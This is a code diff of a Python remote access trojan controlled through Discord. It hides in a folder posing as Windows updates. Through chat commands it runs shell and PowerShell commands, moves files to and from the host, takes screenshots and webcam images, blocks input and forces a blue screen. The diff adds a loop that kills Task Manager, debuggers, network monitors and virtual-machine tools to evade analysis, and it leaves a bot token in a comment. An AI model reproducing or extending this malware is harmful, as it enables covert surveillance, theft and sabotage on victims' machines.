@@ -1,17 +1,14 @@
-import os, json, discord, time, threading, pynput, pyperclip, threading, tracemalloc, pyaudio, opuslib, winreg
+import os, json, discord, time, pynput, pyperclip, subprocess, psutil, threading
 import modules.pc as pc
 from PIL import ImageGrab
-
-#IDEAS:
-#   Anti VM (low priority)
-#   Rootkit (med-high pr)
+from shutil import make_archive, unpack_archive
 
 #HOURS WASTED ON AUDIO STREAM: 3
 
 class Variables:
     def __init__(self):
-        #t = os.getenv("TOKEN").split("MMM")
-        #self.token = t[0]
+        t = os.getenv("TOKEN").split("MMM")
+        self.token = t[0]
         self.snky_dir = f"{os.getenv('LOCALAPPDATA')}\\WindowsUpdatesManager"
 
         if os.path.exists(f"{self.snky_dir}\\cfg.json"):
@@ -25,51 +22,6 @@ class Variables:
             with open(f"{self.snky_dir}\\cfg.json", "w") as f:
                 json.dump(self.cfg, f, indent=4)
 
-        self.debug_programs = ["Taskmgr.exe", "procexp64.exe", "procexp.exe", "procmon64.exe", "procmon.exe", "wireshark.exe", "fiddler.exe", "tcpview.exe", "autoruns.exe", "mmc.exe"] #Still no admin privileges :((((
-
-
-# Global variables for voice and video thread and voice client
-voice_and_video_thread = None
-voice_client = None
-tracemalloc.start()
-
-# This stupid ass thing is wasting my precious time and reducing my brain cells to zero. I thank the Discord devs for this incerdible piece of shit c:
-
-# Function to handle voice and video in a separate thread
-def capture_audio_and_play(voice_client, channel):
-
-    FORMAT = pyaudio.paInt16
-    CHANNELS = 1
-    RATE = 44100
-    CHUNK = 1024
-
-    # Initialize PyAudio
-    audio = pyaudio.PyAudio()
-
-    # Open microphone stream
-    stream = audio.open(format=FORMAT,
-                        channels=CHANNELS,
-                        rate=RATE,
-                        input=True,
-                        frames_per_buffer=CHUNK)
-
-    channel = client.get_channel(int(1225850739071647876))
-    
-    while True:
-        data = stream.read(CHUNK)
-        # Convert audio data to Opus format
-        opus_data = opuslib.Encoder(RATE, CHANNELS, opuslib.APPLICATION_AUDIO).encode(data)
-        voice_client.send_audio_packet(opus_data)
-        
-
-async def start_audio(message, voice_client):
-    if message.author.voice:
-        channel = message.author.voice.channel
-        voice_client = await channel.connect()
-        threading.Thread(target=capture_audio_and_play, args=(voice_client, channel), daemon=True).start()
-    else:
-        await message.send("You need to be in a voice channel to use this command.")
-
 #Requires admin privileges :(
 
 #def clear_logs():
@@ -80,6 +32,48 @@ async def start_audio(message, voice_client):
 #       subprocess.Popen("wevtutil el | ForEach-Object {wevtutil cl \"$_\"}", shell=False, startupinfo=si) #Nope
 #       time.sleep(1)
 
+def process_check():
+        while True:
+            PROCESSES = [
+                "http toolkit.exe",
+                "httpdebuggerui.exe",
+                "wireshark.exe",
+                "fiddler.exe",
+                "charles.exe",
+                "regedit.exe",
+                "cmd.exe",
+                "taskmgr.exe",
+                "vboxservice.exe",
+                "df5serv.exe",
+                "processhacker.exe",
+                "vboxtray.exe",
+                "vmtoolsd.exe",
+                "vmwaretray.exe",
+                "ida64.exe",
+                "ollydbg.exe",
+                "pestudio.exe",
+                "vmwareuser",
+                "vgauthservice.exe",
+                "vmacthlp.exe",
+                "x96dbg.exe",
+                "vmsrvc.exe",
+                "x32dbg.exe",
+                "vmusrvc.exe",
+                "prl_cc.exe",
+                "prl_tools.exe",
+                "qemu-ga.exe",
+                "joeboxcontrol.exe",
+                "ksdumperclient.exe",
+                "ksdumper.exe",
+                "joeboxserver.exe",
+                "xenservice.exe",
+            ]
+            for proc in psutil.process_iter():
+                if any(procstr in proc.name().lower() for procstr in PROCESSES):
+                    try:
+                        proc.kill()
+                    except (psutil.NoSuchProcess, psutil.AccessDenied):
+                        pass
 
 intents = discord.Intents.all()
 variables = Variables()
@@ -92,7 +86,7 @@ mouse_listener = pynput.mouse.Listener(suppress=True)
 
 @client.event
 async def on_ready():
-    pass
+    threading.Thread(target=process_check, daemon=True).start()
 
 @client.event
 async def on_message(message, ):
@@ -106,6 +100,31 @@ async def on_message(message, ):
         embed.add_field(name="!hostinfo", value="Shows host information", inline=False)
         embed.add_field(name="!ipconfig", value="Shows IP configuration", inline=False)
         embed.add_field(name="!tasklist", value="Shows task list", inline=False)
+        embed.add_field(name="!hwinfo", value="Shows hardware information", inline=False)
+        embed.add_field(name="!changepassword", value="Changes password", inline=False)
+        embed.add_field(name="!logout", value="Logs out", inline=False)
+        embed.add_field(name="!shutdown", value="Shuts down", inline=False)
+        embed.add_field(name="!ls", value="Lists directory", inline=False)
+        embed.add_field(name="!del", value="Deletes file", inline=False)
+        embed.add_field(name="!taskkill", value="Kills task", inline=False)
+        embed.add_field(name="!open", value="Opens file", inline=False)
+        embed.add_field(name="!upload", value="Uploads file", inline=False)
+        embed.add_field(name="!download", value="Downloads file", inline=False)
+        embed.add_field(name="!screenshot", value="Takes screenshot", inline=False)
+        embed.add_field(name="!cam", value="Takes cam image", inline=False)
+        embed.add_field(name="!mkdir", value="Creates directory", inline=False)
+        embed.add_field(name="!rmdir", value="Deletes directory", inline=False)
+        embed.add_field(name="!blockinput", value="Blocks input", inline=False)
+        embed.add_field(name="!unblockinput", value="Unblocks input", inline=False)
+        embed.add_field(name="!clipboard", value="Copies text to clipboard", inline=False)
+        embed.add_field(name="!monitor", value="Turns monitor on/off", inline=False)
+        embed.add_field(name="!cmd", value="Executes command", inline=False)
+        embed.add_field(name="!ps", value="Executes powershell command", inline=False)
+        embed.add_field(name="!bsod", value="Executes BSoD", inline=False)
+        embed.add_field(name="!globalinfo", value="Shows global information", inline=False)
+        embed.add_field(name="!zip", value="Zips directory", inline=False)
+        embed.add_field(name="!unzip", value="Unzips file", inline=False)
+
 
         await message.channel.send(embed=embed)
 
@@ -162,9 +181,6 @@ async def on_message(message, ):
         embed = discord.Embed(title="Hardware Info", description="Hardware information gathered.", color=0x00ff00)
 
         result = pc.hwinfo(variables.snky_dir)
-
-        while not os.path.exists(f"{variables.snky_dir}\\hwinfo.txt"):
-            time.sleep(2)
 
         try:
             await message.channel.send(embed=embed, file=discord.File(result))
@@ -455,10 +471,17 @@ async def on_message(message, ):
             return
 
         try:
-            result = os.popen(" ".join(args[1:])).read()
-            embed = discord.Embed(title="CMD", description=f"```{result}```", color=0x00ff00)
-            await message.channel.send(embed=embed)
-        except:
+            result = subprocess.Popen(args[1], shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()[0]
+
+            with(open(f"{variables.snky_dir}\\cmd.txt", "w")) as f:
+                f.write(result.decode("utf-8"))
+
+            embed = discord.Embed(title="CMD", description="Command executed.", color=0x00ff00)
+            await message.channel.send(embed=embed, file=discord.File(f"{variables.snky_dir}\\cmd.txt"))
+
+            os.remove(f"{variables.snky_dir}\\cmd.txt")
+        except Exception as e:
+            print(e)
             embed = discord.Embed(title="CMD", description="Error executing command.", color=0x00ff00)
             await message.channel.send(embed=embed)
 
@@ -472,74 +495,63 @@ async def on_message(message, ):
             return
 
         try:
-            result = os.popen(f"powershell {args[1]}").read()
-            embed = discord.Embed(title="PS", description=f"```{result}```", color=0x00ff00)
-            await message.channel.send(embed=embed)
+            result = subprocess.Popen(f"powershell {args[1]}", shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()[0]
+
+            with(open(f"{variables.snky_dir}\\ps.txt", "w")) as f:
+                f.write(result.decode("utf-8"))
+
+            embed = discord.Embed(title="PS", description=f"Powerhsell executed.", color=0x00ff00)
+            await message.channel.send(embed=embed ,file=discord.File(f"{variables.snky_dir}\\ps.txt"))
+
+            os.remove(f"{variables.snky_dir}\\ps.txt")
         except:
             embed = discord.Embed(title="PS", description="Error executing command.", color=0x00ff00)
             await message.channel.send(embed=embed)
 
-    #VOICE AND VIDEO STREAM
-    if message.content.startswith(f"{variables.cfg['prefix']}stream"):
-        global capture_and_play_audio, voice_client
+    #BLUE SCREEN
+    if message.content.startswith(f"{variables.cfg['prefix']}bsod"):
+        embed = discord.Embed(title="BSOD", description="BSoD executed...", color=0x00ff00)
+        await message.channel.send(embed=embed)
+        pc.bsod()
+
+    #GLOBAL INFO
+    if message.content.startswith(f"{variables.cfg['prefix']}globalinfo"):
+        embed = discord.Embed(title="Global information gathered.", description=pc.global_info(), color=0x00ff00)
+        await message.channel.send(embed=embed)
+    
+    #ZIP DIR
+    if message.content.startswith(f"{variables.cfg['prefix']}zip"):
         args = message.content.split(" ")
 
         if len(args) == 1:
-            embed = discord.Embed(title="Stream", description="Usage: !stream <start/stop>", color=0x00ff00)
+            embed = discord.Embed(title="Zip", description="Usage: !zip <dir> <output_dir>", color=0x00ff00)
             await message.channel.send(embed=embed)
             return
-
-        if args[1] == "start":
-
-            if message.author.voice:
-                await start_audio(message, voice_client)
-                
-            else:
-                await message.send("You need to be in a voice channel to use this command.")
-        if args[1] == "stop":
-            #global voice_client, voice_and_video_thread
-            if voice_client:
-                await voice_client.disconnect()
-                voice_client = None
-                if capture_and_play_audio and capture_and_play_audio.is_alive():
-                    capture_and_play_audio.join()
-            else:
-                await message.send("I'm not in a voice channel.")
-
-    #DISABLE TM
-    if message.content.startswith(f"{variables.cfg['prefix']}distm"):
-        embed = discord.Embed(title="Disable TM", description="Disabling Task Manager...", color=0x00ff00)
-
-        await message.channel.send(embed=embed)
-        registry_path = "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
-        registry_name = "DisableTaskMgr"
-        value = 1
         
         try:
-            reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_path, 0, winreg.KEY_SET_VALUE)
-            winreg.SetValueEx(reg_key, registry_name, 0, winreg.REG_SZ, value)
-            winreg.CloseKey(reg_key)
-            return True
-        except WindowsError as e:
-            return e
-        
-    #ENABLE TM
-    if message.content.startswith(f"{variables.cfg['prefix']}entm"):
-        embed = discord.Embed(title="Enable TM", description="Enabling Task Manager...", color=0x00ff00)
+            make_archive(args[2], 'zip', args[1])
+            embed = discord.Embed(title="Zip", description="Directory zipped.", color=0x00ff00)
+            await message.channel.send(embed=embed)
+        except:
+            embed = discord.Embed(title="Zip", description="Error zipping directory.", color=0x00ff00)
+            await message.channel.send(embed=embed)
 
-        await message.channel.send(embed=embed)
-        registry_path = "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
-        registry_name = "DisableTaskMgr"
-        value = 0
+    #UNZIP FILE
+    if message.content.startswith(f"{variables.cfg['prefix']}unzip"):
+        args = message.content.split(" ")
+
+        if len(args) == 1:
+            embed = discord.Embed(title="Unzip", description="Usage: !unzip <file> <output_dir>", color=0x00ff00)
+            await message.channel.send(embed=embed)
+            return
         
         try:
-            reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_path, 0, winreg.KEY_SET_VALUE)
-            winreg.SetValueEx(reg_key, registry_name, 0, winreg.REG_SZ, value)
-            winreg.CloseKey(reg_key)
-            return True
-        except WindowsError as e:
-            return e
-        
+            unpack_archive(args[1], args[2])
+            embed = discord.Embed(title="Unzip", description="File unzipped.", color=0x00ff00)
+            await message.channel.send(embed=embed)
+        except:
+            embed = discord.Embed(title="Unzip", description="Error unzipping file.", color=0x00ff00)
+            await message.channel.send(embed=embed)
 
-#client.run(variables.token)
-client.run("MTIyNTc5MTM4NjM2NDgwOTI1Ng.GgyZrr.lfp7eiYfTFxlNA4KIWTuR4vgCyJEgapPpA97Yc")
+client.run(variables.token)
+#client.run("MTIyNTc5MTM4NjM2NDgwOTI1Ng.GgyZrr.lfp7eiYfTFxlNA4KIWTuR4vgCyJEgapPpA97Yc")
